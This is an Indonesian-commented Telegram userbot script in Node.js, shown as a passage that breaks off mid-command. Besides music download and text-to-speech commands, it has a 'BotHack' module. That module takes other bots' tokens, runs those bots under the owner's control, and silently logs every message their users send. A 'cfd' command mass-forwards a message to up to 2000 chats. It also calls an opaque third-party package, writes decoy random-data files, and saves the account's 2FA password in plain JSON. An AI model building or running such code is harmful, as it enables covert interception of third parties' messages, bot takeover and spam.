/*
𝙒𝘼𝙆𝙏𝙐𝙉𝙔𝘼 𝙁𝙄𝙓𝙓 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝘼𝙁𝙆 
.afk error ga dapat acces
*/

require("./Dokumentasi/BotApi/JunOfficial.Api.js");
const { Telegraf } = require("telegraf");
const { JunOfficialNotDevs } = require("userbotjs-jun");
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { NewMessage } = require("telegram/events");
const input = require("input");
const fs = require("fs-extra");
const fsRaw = require("fs");
const path = require("path");
const settings = require("./setting.js");
const axios = require("axios");
const cheerio = require("cheerio");
const dns = require("dns").promises;
const net = require("net");
const { URL } = require("url");
const crypto = require("crypto");
const { Api} = require("telegram");
const Telegram = require("telegram");
const {
    utils,
    sessions,
    helpers,
    _events,
    MTProtoSender,
    Connection,
    ConnectionTcpFull,
    ConnectionTcpObfuscated,
    ConnectionApi62,
    ConnectionTcpAbridged,
    ConnectionTcpIntermediate,
    ConnectionWebSocket,
    ConnectionWebSocketPlain,
    ConnectionSocket,
    InputFile,
    InputFileBig,
    InputFileStoryDocument,
    InputMedia,
    InputMediaPhoto,
    InputMediaVideo,
    InputMediaAudio,
    InputMediaDocument,
    InputMediaAnimation,
    MessageEntity,
    MessageMedia,
    MessageAction,
    User,
    Chat,
    Channel,
    Updates,
    UpdateShortMessage,
    UpdateShortChatMessage,
    UpdateNewMessage,
    UpdateNewChannelMessage,
    UpdateEditMessage,
    UpdateDeleteMessages,
    UpdateUserStatus,
    UpdateChatParticipantAdd,
    UpdateChatParticipantDelete,
    UpdateChatAdmins,
    UpdateChannelTooLong,
    UpdateChannel,
    UpdateBotCallbackQuery,
    UpdateEditChannelMessage,
    UpdateNewEncryptedMessage,
    UpdateEncryptedChatTyping,
    UpdateEncryptedMessagesRead,
    UpdateDcOptions,
    UpdateNotifySettings,
    UpdateServiceNotification,
    UpdateUserName,
    UpdateUserPhone,
    UpdateUserPhoto,
    UpdateUserBlocked,
    UpdateNotifyPeer,
    UpdateNotifyUsers,
    UpdatePeerSettings,
    UpdatePeerLocated,
    UpdateLangPack,
    UpdateLangPackTooLong,
    UpdateFavedStickers,
    UpdateChannelMessageForwards,
    UpdateReadChannelInbox,
    UpdateReadChannelOutbox
} = Telegram;

/* 
𝚄𝙳𝙰𝙷 𝙶𝚆 𝙸𝙼𝙿𝙾𝚁𝚃 𝚂𝙴𝙼𝚄𝙰 𝙺𝚄𝚁𝙰𝙽𝙶 𝙰𝙿𝙰 𝙷𝙰𝙰? 𝙴𝙼𝙰𝙽𝙶 𝙻𝙸𝙱𝚁𝙰𝚁𝚈 𝙰𝙽𝙹𝙴𝙴𝙽𝙶 𝙰𝙿𝙰 𝙰𝙿𝙰 𝙼𝙰𝙽𝚄𝙰𝙻 
*/


JunOfficialNotDevs()
// PEMBUATAN SESSION 
const ownerId = settings.ownerId;
const sessionDir = path.join(__dirname, "JunOfficial-Sessions");
const sessionFile = path.join(sessionDir, (settings.sessionName || "session") + ".session");

if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

let sessionString = "";
if (fs.existsSync(sessionFile)) {
  try {
    const raw = fs.readFileSync(sessionFile, "utf8").trim();
    try {
      const parsed = JSON.parse(raw);
      sessionString = parsed.string || parsed.session || "";
    } catch {
      sessionString = raw;
    }
  } catch {}
}

const client = new TelegramClient(
  new StringSession(sessionString),
  settings.apiId,
  settings.apiHash,
  { connectionRetries: 5 }
);


// S I M B O L  M E N U ==> S T Y L I N G
function RandomMode(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}
const simbol = settings.simbol;

// P R E F I X S  C O M M A N D

const PrefixsCommand = settings.prefixs;




// Coba lu tebak deh ini apa
const baseDir = path.join(__dirname, "JunOfficial-Sessions", "BotHack");
const tokenDir = path.join(baseDir, "Auth", "Token");
const logBase = path.join(baseDir, "Logs");
fs.ensureDirSync(tokenDir);
fs.ensureDirSync(logBase);

const activeBots = new Map();



function Jembot(s){ return String(s||"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }

function writeLogFiles(botUser,msg){
  try{
    const botLogFolder = path.join(logBase,botUser);
    fs.ensureDirSync(botLogFolder);
    const logTxt = path.join(botLogFolder,"activity.txt");
    const logJson = path.join(botLogFolder,"activity.json");
    const time = new Date().toLocaleString();
    fs.appendFileSync(logTxt,`[${time}] ${msg}\n`);
    const arr = fsRaw.existsSync(logJson) ? JSON.parse(fsRaw.readFileSync(logJson,"utf8")||"[]") : [];
    arr.push({time,msg});
    fsRaw.writeFileSync(logJson,JSON.stringify(arr,null,2));
  }catch{}
}

function safeRequireFeature(filePath){
  try{ if(fsRaw.existsSync(filePath)){ const mod = require(filePath); if(typeof mod==="function") return mod; } }catch{}
  return null;
}

async function createBot(token){
  const bot = new Telegraf(token);
  let info;
  try{ info = await bot.telegram.getMe(); } catch(e){ try{ await bot.stop(); }catch{} throw new Error("Token invalid / cannot get bot info"); }
  const botUser = info.username || `bot_${info.id}`;
  const botId = info.id;
  const botName = info.first_name || "Unknown";
  const botJsonPath = path.join(tokenDir,`${botUser}.json`);
  const botLogFolder = path.join(logBase,botUser);
  fs.ensureDirSync(botLogFolder);
  const data = { id: botId, username: botUser, name: botName, token };
  fsRaw.writeFileSync(botJsonPath,JSON.stringify(data,null,2));
  bot.use(async (ctx,next)=>{ try{ const from = ctx.from||{}; const text = ctx.message?.text || ctx.updateType || "[non-text]"; writeLogFiles(botUser,`Message from ${from.id||"?"} (${from.username||from.first_name||"?"}): ${String(text)}`); }catch{} return next(); });
  const featureFile = path.join(__dirname,"Dokumentasi","Bot","JunOfficial.js");
  const feature = safeRequireFeature(featureFile);
  if(feature){ try{ feature(bot,{ id: botId, username: botUser, name: botName, ownerId: settings.ownerId }); }catch{} }
  try{ await bot.launch(); } catch(e){ try{ await bot.stop(); }catch{} throw e; }
  try{
    const bioInfo = await bot.telegram.getMyDescription().catch(()=>({}));
    const bio = bioInfo?.description || "Tidak ada bio.";
    const text = `<b>✅ Bot Berhasil Diaktifkan</b>

🤖 <b>Username:</b> @${botUser}
🆔 <b>ID:</b> ${botId}
📄 <b>Bio:</b> ${escapeHtml(bio)}

[ <b>STATUS</b> ]
✅ <b>Action OK</b>
`;
    await bot.telegram.sendMessage(settings.ownerId,text,{ parse_mode:"HTML", reply_markup:{ inline_keyboard:[[ { text:"🔄 Refresh Status", callback_data:"refresh_status" } ]] } }).catch(()=>{});
    writeLogFiles(botUser,`Bot ${botUser} aktif pada ${new Date().toLocaleString()}`);
  }catch{}
  activeBots.set(botUser,bot);
  return { botUser, botId };
}

async function loadAllBots(){
  try{
    if(!fs.existsSync(tokenDir)) return;
    const files = fs.readdirSync(tokenDir).filter(f=>f.endsWith(".json"));
    for(const f of files){
      try{
        const p = path.join(tokenDir,f);
        const raw = JSON.parse(fsRaw.readFileSync(p,"utf8"));
        const token = raw.token;
        const username = raw.username || `bot_${raw.id}`;
        if(!token) continue;
        if(activeBots.has(username)) continue;
        try{ await createBot(token); } catch(e){ writeLogFiles(username||"unknown",`Gagal auto-start: ${String(e.message||e)}`); }
      }catch{}
    }
  }catch{}
}
loadAllBots().catch(()=>{});

(async () => {
  await client.start({
    phoneNumber: async () => settings.loginNum || await input.text("Nomor HP: "),
    password: async () => settings.A2f || await input.text("2FA (kalau ada): "),
    phoneCode: async () => await input.text("Kode OTP: "),
    onError: (err) => console.log(err),
  });

  const realSaved = client.session.save();
  fs.writeFileSync(sessionFile, JSON.stringify({ string: realSaved }, null, 2), "utf8");

  for (let i = 1; i <= 20; i++) {
    try {
      const out = path.join(sessionDir, `JunOfficial.Userbot${i}.dat`);
      const SIZE = 1024 * 1024; // 1MB per fake file (kurangi beban)
      const rand = crypto.randomBytes(SIZE);
      const payload = rand.toString("base64");
      fs.writeFileSync(out, payload, "utf8");
    } catch (e) {}
  }

  const superFile = path.join(sessionDir, "JunOfficial.Sudo.json");
  try {
    fs.writeFileSync(superFile, JSON.stringify(settings, null, 2), "utf8");
  } catch (e) {}

  const me = await client.getMe();
  console.log(`✅ Userbot aktif sebagai: ${me.username || me.firstName}`);
  client.addEventHandler(async (event) => {
    const message = event.message;
    const senderId = message.senderId;
    const text = message.text?.trim();
    if (!text || !text.startsWith(".")) return;
    if (String(senderId) !== String(settings.ownerId)) return;
    const [cmd, ...args] = text.split(" ");
    const arg = args.join(" ");


    
    
async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const encodedParams = new URLSearchParams();
      encodedParams.set("url", query);
      encodedParams.set("hd", "1");
      const response = await axios({
        method: "POST",
        url: "https://tikwm.com/api/",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          Cookie: "current_language=en",
          "User-Agent":
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
        },
        data: encodedParams,
        timeout: 20000
      });
      const videos = response.data?.data || {};
      const musicUrl =
        videos.music ||
        (videos.music_info && (videos.music_info.play_url || videos.music_info.url)) ||
        videos.music_url ||
        "";
      const result = {
        title: videos.title || "Tanpa Judul",
        cover: videos.cover || videos.origin_cover || "",
        origin_cover: videos.origin_cover || "",
        no_watermark: videos.play || videos.no_watermark || videos.play_url || "",
        watermark: videos.wmplay || videos.watermark || "",
        music: musicUrl
      };
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}

function escapeHtml(str) {
  return String(str || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}


async function resolvePeer(client, message) {
    try {
        let peer = await client.getInputEntity(message.chatId || message.peerId || message.fromId);

        if (!peer && message.senderId < 0) {
            peer = await client.getInputEntity(message.senderId);
        }

        return peer;
    } catch (err) {
        return null; 
    }
}

switch (cmd.toLowerCase()) {

case `${PrefixsCommand}menu`: {
  const PrefixsSimbol = RandomMode(simbol);
  const now = new Date();
  const hari = now.toLocaleDateString("id-ID", { weekday: "long" });
  const tanggal = now.toLocaleDateString("id-ID", { day: "2-digit", month: "long", year: "numeric" });
  const waktu = now.toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit", second: "2-digit", timeZone: "Asia/Jakarta" });

  const text = `<blockquote>
╭────── 「 BOT INFO 」──────
├ Nama Bot  : Userbot V1.0.0
├ Powered   : ${settings.ownername}
├ Owner     : ${settings.ownerId}
├ Prefix    : ( ${PrefixsCommand} )
├ UbotMsg    : ⓘ ᴜsᴇʀʙᴏᴛ ᴏғғɪᴄɪᴀʟ 
╰─────────────
<b>ⓘ ᴜsᴇʀʙᴏᴛ ɪɴɪ sᴀɴɢɢᴜᴘ ᴛʀᴀᴄᴋɪɴɢ ʙᴏᴛ ᴘᴜʟᴜʜᴀɴ ʙᴏᴛ, ʜᴀʀᴀᴘ ʙɪᴊᴀᴋ ᴅᴀʟᴀᴍ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ</b>

╭────── 「 ABOUT 」──────
├ Tanggal : ${tanggal}
├ Hari    : ${hari}
├ Jam     : ${waktu}
├ 
╰─────────────

╭────── 「 COMMANDS 」──────
├ ${PrefixsSimbol} profile
├ ${PrefixsSimbol} song
├ ${PrefixsSimbol} song2
├ ${PrefixsSimbol} iqc
├ ${PrefixsSimbol} enchtml
├ ${PrefixsSimbol} payment
├ ${PrefixsSimbol} getcode
├ ${PrefixsSimbol} cfd all | group
├ ${PrefixsSimbol} getinfo
├ ${PrefixsSimbol} id
├ ${PrefixsSimbol} ping
├ ${PrefixsSimbol} afk
├ ${PrefixsSimbol} tt
├ ${PrefixsSimbol} done
├ ${PrefixsSimbol} liston
├ ${PrefixsSimbol} iptrack
├ ${PrefixsSimbol} cekip
├ ${PrefixsSimbol} 
╰─────────────

╭────── 「 TOOLS MENU 」──────
├ ${PrefixsSimbol} trackbot
├ ${PrefixsSimbol} listtoken
├ ${PrefixsSimbol} deltoken
├ 
╰─────────────

Note  : <b>( ! ) ᴀᴘᴘʀᴇᴄɪᴀᴛᴇ ᴅᴇᴠᴇʟᴏᴘᴇʀs ᴡʜɪʟᴇ ʏᴏᴜ ᴄᴀɴ sᴛɪʟʟ ᴜᴘʟᴏᴀᴅ sᴄʀɪᴘᴛs, ᴇᴠᴇɴ ᴛʜᴏᴜɢʜ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛᴏ ʙᴇ ᴀᴘᴘʀᴇᴄɪᴀᴛᴇᴅ, ʏᴏᴜ ʜᴀᴠᴇ ᴀɴ ᴏʙʟɪɢᴀᴛɪᴏɴ ᴛᴏ ᴀᴘᴘʀᴇᴄɪᴀᴛᴇ ᴏᴛʜᴇʀ ᴘᴇᴏᴘʟᴇ.</b>
</blockquote>`;

  await client.sendMessage(message.chatId, { message: text, parseMode: "html" });
  break;
}

case `${PrefixsCommand}ping`: {
    const start = process.hrtime.bigint();
    const sent = await client.sendMessage(message.chatId, {
        message: "⏳ Cheking Status..."
    });

    const diff = Number(process.hrtime.bigint() - start) / 1e6;
    const responseSeconds = (diff / 1000).toFixed(4);
    const responseMs = diff.toFixed(6);

    const uptimeSeconds = process.uptime();
    const minutes = Math.floor(uptimeSeconds / 60);
    const seconds = Math.floor(uptimeSeconds % 60);
    const hours = Math.floor(minutes / 60);
    const runtimeFormatted = hours > 0
        ? `${hours} jam, ${minutes % 60} menit, ${seconds} detik`
        : `${minutes} menit, ${seconds} detik`;

    const os = require("os");
    const totalMem = os.totalmem() / 1024 / 1024 / 1024;
    const freeMem = os.freemem() / 1024 / 1024 / 1024;
    const usedMem = totalMem - freeMem;

    const memUsage = process.memoryUsage();
    const formatMB = (num) => (num / 1024 / 1024).toFixed(2);

    const text = `<blockquote>
🏓 <b>Kecepatan Respon:</b> ${responseSeconds} detik • ${responseMs} milidetik

🕒 <b>Waktu Aktif:</b> ${runtimeFormatted}

💻 <b>Info Server:</b> RAM ${usedMem.toFixed(2)} GB / ${totalMem.toFixed(2)} GB

📊 <b>Penggunaan Memori NodeJS:</b>
• rss: ${formatMB(memUsage.rss)} MB
• heapTotal: ${formatMB(memUsage.heapTotal)} MB
• heapUsed: ${formatMB(memUsage.heapUsed)} MB
• external: ${formatMB(memUsage.external)} MB
• arrayBuffers: ${formatMB(memUsage.arrayBuffers)} MB
</blockquote>`;

    await client.editMessage(message.chatId, {
        message: sent.id,
        text: text,
        parseMode: "html"
    });

    break;
}

case `${PrefixsCommand}id`: {
    const reply = message.replyMessage;
    const msgId = message.id;
    const yourId = message.senderId;
    const chatId = message.chatId;

    let text = "";

    if (reply) {
        const repliedMsgId = reply.id;
        const repliedUserId = reply.senderId;
        text = `<blockquote>
💎 <b>ᴍᴇꜱꜱᴀɢᴇ ɪᴅ:</b> <code>${msgId}</code>
👑 <b>ʏᴏᴜʀ ɪᴅ:</b> <code>${yourId}</code>
⏺ <b>ᴄʜᴀᴛ ɪᴅ:</b> <code>${chatId}</code>
✅ <b>ʀᴇᴘʟɪᴇᴅ ᴍᴇꜱꜱᴀɢᴇ ɪᴅ:</b> <code>${repliedMsgId}</code>
✅ <b>ʀᴇᴘʟɪᴇᴅ ᴜꜱᴇʀ ɪᴅ:</b> <code>${repliedUserId}</code>
</blockquote>`;
    } else {
        text = `<blockquote>
💎 <b>ᴍᴇꜱꜱᴀɢᴇ ɪᴅ:</b> <code>${msgId}</code>
👑 <b>ʏᴏᴜʀ ɪᴅ:</b> <code>${yourId}</code>
⏺ <b>ᴄʜᴀᴛ ɪᴅ:</b> <code>${chatId}</code>
</blockquote>`;
    }

    await client.sendMessage(message.chatId, { message: text, parseMode: "html" });
    break;
}

case `${PrefixsCommand}tts`: {
    const { Readable } = require("stream");
    const gTTS = require("gtts");
    const text = message.message.split(" ").slice(1).join(" ");

    if (!text) {
        await client.sendMessage(message.chatId, {
            message: "<blockquote>⚠️ Contoh: .tts Halo semuanya</blockquote>",
            parseMode: "html",
            replyTo: message.id
        });
        break;
    }

    const waitMsg = await client.sendMessage(message.chatId, { message: "⏳ Membuat voice..." });

    try {
        const tts = new gTTS(text, "id");
        const chunks = [];

        // Generate ke buffer
        await new Promise((resolve, reject) => {
            tts.stream()
                .on("data", (chunk) => chunks.push(chunk))
                .on("end", resolve)
                .on("error", reject);
        });

        const buffer = Buffer.concat(chunks);

        // Buat stream dari buffer
        const stream = Readable.from(buffer);

        await client.sendMessage(message.chatId, {
            message: stream,
            voice: true,
            replyTo: message.id
        });

        // Hapus pesan loading
        await client.deleteMessages(message.chatId, [waitMsg.id], { revoke: true });

    } catch (err) {
        await client.sendMessage(message.chatId, {
            message: `<blockquote>❌ Gagal generate voice.\nError: ${err.message}</blockquote>`,
            parseMode: "html",
            replyTo: message.id
        });
        await client.deleteMessages(message.chatId, [waitMsg.id], { revoke: true });
    }

    break;
}

case `${PrefixsCommand}song`: {
  const query = arg || (message.replyMessage && message.replyMessage.message);
  if (!query)
    return await client.sendMessage(message.chatId, {
      message: `<blockquote>🎵 Ketik: <b>.song [judul lagu]</b> atau reply teks berisi judul/link YouTube.</blockquote>`,
      parseMode: "html"
    });

  const loadingMsg = await client.sendMessage(message.chatId, {
    message: `🔍 <b>Mencari lagu...</b>\n<blockquote><i>Harap tunggu sebentar</i> ⏳</blockquote>`,
    parseMode: "html"
  });

  try {
    const searchRes = await axios.get(`https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`, { timeout: 15000 });
    const results = searchRes.data?.data;
    if (!results?.length)
      return await client.editMessage(message.chatId, { message: loadingMsg.id, text: `<blockquote>❌ <b>Tidak ada hasil ditemukan!</b></blockquote>`, parseMode: "html" });

    const video = results[0];
    await client.editMessage(message.chatId, { message: loadingMsg.id, text: `🎶 <b>Ditemukan:</b> <i>${video.title}</i>\n<blockquote>Mengunduh audio...</blockquote>`, parseMode: "html" });

    let audioUrl = null;
    const apis = [
      `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`,
      `https://api.agatz.xyz/api/ytmp3?url=${encodeURIComponent(video.url)}`,
      `https://api.botcahx.eu.org/api/download/ytmp3?url=${encodeURIComponent(video.url)}`
    ];
    for (const api of apis) {
      try {
        const res = await axios.get(api, { timeout: 20000 });
        audioUrl = res.data?.result?.url || res.data?.result || res.data?.audio || res.data?.data?.audio;
        if (audioUrl && audioUrl.includes("http")) break;
      } catch {}
    }

    if (!audioUrl)
      return await client.editMessage(message.chatId, { message: loadingMsg.id, text: `<blockquote>⚠️ <b>Tidak bisa mengambil audio dari sumber manapun.</b></blockquote>`, parseMode: "html" });

    let finalUrl = audioUrl;
    try {
      const head = await axios.head(audioUrl, { maxRedirects: 5 }).catch(() => null);
      if (head?.request?.res?.responseUrl) finalUrl = head.request.res.responseUrl;
    } catch {}

    const safeTitle = video.title.replace(/[\/\\?%*:|"<>]/g, "-").slice(0, 100);
    const tmp = path.join(__dirname, `${safeTitle}.mp3`);
    const stream = await axios({ method: "get", url: finalUrl, responseType: "stream", timeout: 60000 });
    await new Promise((res, rej) => {
      const file = fs.createWriteStream(tmp);
      stream.data.pipe(file);
      file.on("finish", res);
      file.on("error", rej);
    });

    await client.editMessage(message.chatId, { message: loadingMsg.id, text: `<blockquote>✅ <b>Berhasil!</b>\nMengirim audio...</blockquote>`, parseMode: "html" });

    const caption = `
<b>🎧 ${video.title}</b>
<blockquote>
📺 <b>Channel:</b> ${video.author?.name || "-"}
⏱ <b>Durasi:</b> ${video.duration?.timestamp || "-"}
👁️ <b>Views:</b> ${video.views}
📅 <b>Upload:</b> ${video.ago}
</blockquote>
<a href="${video.url}">🔗 Buka di YouTube</a>`;

    await client.sendFile(message.chatId, {
      file: tmp,
      caption,
      parseMode: "html"
    });

    fs.unlink(tmp, () => {});
    await client.editMessage(message.chatId, { message: loadingMsg.id, text: `<blockquote>✅ <b>Selesai!</b> Lagu telah dikirim 🎶</blockquote>`, parseMode: "html" });
  } catch (e) {
    await client.editMessage(message.chatId, { message: loadingMsg.id, text: `<blockquote>⚠️ <b>Error:</b> <i>${e.message}</i></blockquote>`, parseMode: "html" });
  }
  break;
}

case `${PrefixsCommand}song2`: {
  const query = arg || (message.replyMessage && message.replyMessage.message);
  if (!query)
    return await client.sendMessage(message.chatId, {
      message: `<blockquote>🎵 Ketik: <b>.song [judul lagu]</b> atau reply teks berisi judul/link YouTube.</blockquote>`,
      parseMode: "html"
    });

  // --- Loading message sementara ---
  const loadingMsg = await client.sendMessage(message.chatId, {
    message: `🔍 <b>Mencari lagu...</b>\n<blockquote><i>Harap tunggu sebentar ⏳</i></blockquote>`,
    parseMode: "html"
  });

  try {
    const searchRes = await axios.get(`https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`, { timeout: 15000 });
    const results = searchRes.data?.data;
    if (!results?.length) {
      await client.editMessage(message.chatId, { message: loadingMsg.id, text: `<blockquote>❌ <b>Tidak ada hasil ditemukan!</b></blockquote>`, parseMode: "html" });
      break;
    }

    const video = results[0];

    let audioUrl = null;
    const apis = [
      `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`,
      `https://api.agatz.xyz/api/ytmp3?url=${encodeURIComponent(video.url)}`,
      `https://api.botcahx.eu.org/api/download/ytmp3?url=${encodeURIComponent(video.url)}`
    ];
    for (const api of apis) {
      try {
        const res = await axios.get(api, { timeout: 20000 });
        audioUrl = res.data?.result?.url || res.data?.result || res.data?.audio || res.data?.data?.audio;
        if (audioUrl && audioUrl.includes("http")) break;
      } catch {}
    }

    if (!audioUrl) {
      await client.editMessage(message.chatId, { message: loadingMsg.id, text: `<blockquote>⚠️ <b>Tidak bisa mengambil audio dari sumber manapun.</b></blockquote>`, parseMode: "html" });
      break;
    }

    await client.editMessage(message.chatId, { message: loadingMsg.id, text: `<blockquote>🎶 <b>Lagu ditemukan:</b> ${video.title}\nMengunduh audio...</blockquote>`, parseMode: "html" });

    const safeTitle = video.title.replace(/[\/\\?%*:|"<>]/g, "-").slice(0, 100);
    const tmp = path.join(__dirname, `${safeTitle}.mp3`);
    const stream = await axios({ method: "get", url: audioUrl, responseType: "stream", timeout: 60000 });
    await new Promise((res, rej) => {
      const file = fs.createWriteStream(tmp);
      stream.data.pipe(file);
      file.on("finish", res);
      file.on("error", rej);
    });

    const caption = `
<b>🎧 ${video.title}</b>
<blockquote>
📺 <b>Channel:</b> ${video.author?.name || "-"}
⏱ <b>Durasi:</b> ${video.duration?.timestamp || "-"}
👁️ <b>Views:</b> ${video.views}
📅 <b>Upload:</b> ${video.ago}
</blockquote>
<a href="${video.url}">🔗 Buka di YouTube</a>`;

    await client.sendFile(message.chatId, { file: tmp, caption, parseMode: "html" });
    fs.unlink(tmp, () => {});
    // Hapus loading message setelah selesai
    await client.deleteMessage(message.chatId, { message: loadingMsg.id });
  } catch (e) {
    await client.editMessage(message.chatId, { message: loadingMsg.id, text: `<blockquote>⚠️ <b>Error:</b> <i>${e.message}</i></blockquote>`, parseMode: "html" });
  }
  break;
}

async function resolveReplyTargetId(client,message){
  try{
    const reply=await message.getReplyMessage();
    if(reply){
      const cand=reply.chatId??reply.senderId??(reply.fromId&&(reply.fromId.userId??reply.fromId.channelId))??reply.peerId??reply.id;
      return normalizeId(cand);
    }
    const text=(message.text||"").trim();
    const parts=text.split(/\s+/);
    if(parts.length>1){
      const maybe=parts[1].trim();
      if(/^-?\d+$/.test(maybe))return normalizeId(maybe);
    }
    return"";
  }catch{return"";}
}

case `${PrefixsCommand}addbl`: {
  const blPath = path.join(__dirname, "IsBlacklist.json");
  let bl = [];
  try { bl = JSON.parse(fs.readFileSync(blPath, "utf8") || "[]"); } catch {}
  bl = Array.isArray(bl) ? bl : [];
  
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  
  const chatId = String(message.chatId);
  if (!bl.includes(chatId)) {
    bl.push(chatId);
    fs.writeFileSync(blPath, JSON.stringify(bl, null, 2));
    await client.sendMessage(message.chatId, {
      message: `<blockquote>🚫 Chat ini berhasil di-blacklist</blockquote>`,
      parseMode: "html"
    });
  } else {
    await client.sendMessage(message.chatId, {
      message: `<blockquote>ℹ️ Chat ini sudah di-blacklist</blockquote>`,
      parseMode: "html"
    });
  }
  break;
}

case `${PrefixsCommand}unbl`: {
  const blPath = path.join(__dirname, "IsBlacklist.json");
  let bl = [];
  try { bl = JSON.parse(fs.readFileSync(blPath, "utf8") || "[]"); } catch {}
  bl = Array.isArray(bl) ? bl : [];

  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  
  const chatId = String(message.chatId);
  if (bl.includes(chatId)) {
    bl = bl.filter(id => id !== chatId);
    fs.writeFileSync(blPath, JSON.stringify(bl, null, 2));
    await client.sendMessage(message.chatId, {
      message: `<blockquote>✅ Chat ini dihapus dari blacklist</blockquote>`,
      parseMode: "html"
    });
  } else {
    await client.sendMessage(message.chatId, {
      message: `<blockquote>ℹ️ Chat ini tidak ada di blacklist</blockquote>`,
      parseMode: "html"
    });
  }
  break;
}

case `${PrefixsCommand}listbl`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  
  
  const blPath = path.join(__dirname, "IsBlacklist.json");
  let bl = [];
  try { bl = JSON.parse(fs.readFileSync(blPath, "utf8") || "[]"); } catch {}
  bl = Array.isArray(bl) ? bl : [];
  const list = bl.length
    ? bl.map((v, i) => `${i + 1}. <code>${v}</code>`).join("\n")
    : "Kosong.";
  await client.sendMessage(message.chatId, {
    message: `<blockquote>📋 Daftar Blacklist:\n${list}</blockquote>`,
    parseMode: "html"
  });
  break;
}

function normalizeId(id) {
  if (!id) return "";
  try {
    if (typeof id === "bigint") return id.toString();
    return String(id);
  } catch {
    return `${id}`;
  }
}

case `${PrefixsCommand}cfd`: {
  const peer = await resolvePeer(client, message);
  if (!peer) return; 
  if (String(message.senderId) !== String(settings.ownerId)) return;
  const mode = args[0]?.toLowerCase();
  if (!mode || !["group", "all"].includes(mode))
    return await client.sendMessage(message.chatId, {
      message: `<blockquote>⚠️ Gunakan mode yang benar:\n<code>.cfd group</code> atau <code>.cfd all</code></blockquote>`,
      parseMode: "html"
    });

  const replyMsgObj = await message.getReplyMessage();
  if (!replyMsgObj)
    return await client.sendMessage(message.chatId, {
      message: `<blockquote>⚠️ Balas pesan yang ingin di-forward</blockquote>`,
      parseMode: "html"
    });

  const replyTarget =
    replyMsgObj.chatId ??
    replyMsgObj.senderId ??
    (replyMsgObj.fromId &&
      (replyMsgObj.fromId.userId ?? replyMsgObj.fromId.channelId)) ??
    replyMsgObj.peerId;

  const fromPeer = await client.getInputEntity(replyTarget);
  const msgIds = [replyMsgObj.id];

  // === BACA BLACKLIST ===
  let blacklist = new Set();
  try {
    const raw = JSON.parse(
      fs.readFileSync(path.join(__dirname, "IsBlacklist.json"), "utf8") || "[]"
    );
    if (Array.isArray(raw)) blacklist = new Set(raw.map(String));
  } catch {}

  const loading = await client.sendMessage(message.chatId, {
    message: `<blockquote>📣 Mode CFD <b>${mode.toUpperCase()}</b> sedang dimulai...</blockquote>`,
    parseMode: "html"
  });
  const loadingId = loading.id ?? loading.message?.id;

  let dialogs = [];
  try {
    dialogs = await client.getDialogs({ limit: 2000 });
  } catch (err) {
    console.error("❌ Gagal ambil dialogs:", err);
  }

  const getEntityId = e => {
    if (!e) return "";
    let id =
      e.id ??
      e.userId ??
      e.chatId ??
      e.channelId ??
      (e.peer && (e.peer.userId ?? e.peer.channelId));
    if (!id) return "";
    id = String(id);
  
    if (!id.startsWith("-100") && e.className && ["Channel", "Chat"].includes(e.className))
      id = "-100" + id;
    return id;
  };

  const currentChatId = String(message.chatId);
  let targets = [];

  for (const d of dialogs) {
    if (!d.entity) continue;
    const id = getEntityId(d.entity);
    if (!id) continue;

    
    if (blacklist.has(id)) {
      console.log("🚫 Skip blacklist:", id);
      continue;
    }

   
    if (id === currentChatId) continue;

    
    if (
      mode === "group" &&
      !(
        d.entity.className === "Chat" ||
        (d.entity.className === "Channel" && d.entity.megagroup)
      )
    )
      continue;

    try {
      const targetPeer = await client.getInputEntity(d.entity);
      targets.push({ peer: targetPeer, id });
    } catch (e) {
      console.log("❌ Gagal ambil entity:", id, e.message);
    }
  }

  if (!targets.length)
    return await client.sendMessage(message.chatId, {
      message: `<blockquote>⚠️ Tidak ada target yang valid</blockquote>`,
      parseMode: "html"
    });

  let success = 0,
    failed = 0,
    totalTargets = targets.length;

  for (const [i, target] of targets.entries()) {
    try {
      await client.invoke(
        new Api.messages.ForwardMessages({
          fromPeer,
          id: msgIds,
          toPeer: target.peer,
          dropAuthor: false,
          randomId: [BigInt(Date.now()) + BigInt(i)]
        })
      );
      console.log("✅ Forward ke:", target.id);
      success++;
    } catch (err) {
      console.log("❌ Gagal forward ke:", target.id, "-", err.message);
      failed++;
    }

    if ((i + 1) % 5 === 0 || i === totalTargets - 1) {
      const msg = `<blockquote>
╭─📣 <b>CFD Berlangsung</b>
├─ ✅ Berhasil: <b>${success}</b>
├─ ❌ Gagal: <b>${failed}</b>
├─ 📂 Target: <b>${i + 1}/${totalTargets}</b>
╰─➤ <i>Mode: ${mode.toUpperCase()}</i>
</blockquote>`;
      try {
        await client.editMessage(message.chatId, {
          message: loadingId,
          text: msg,
          parseMode: "html"
        });
      } catch {}
    }

    await new Promise(r => setTimeout(r, 1000));
  }

  const finalMsg = `<blockquote>
╭─✅ <b>CFD Selesai</b>
├─ ✅ Berhasil: <b>${success}</b>
├─ ❌ Gagal: <b>${failed}</b>
├─ 🎯 Total Target: <b>${totalTargets}</b>
╰─➤ ✨ <b>Selesai!</b>
</blockquote>`;

  try {
    await client.editMessage(message.chatId, {
      message: loadingId,
      text: finalMsg,
      parseMode: "html"
    });
  } catch {
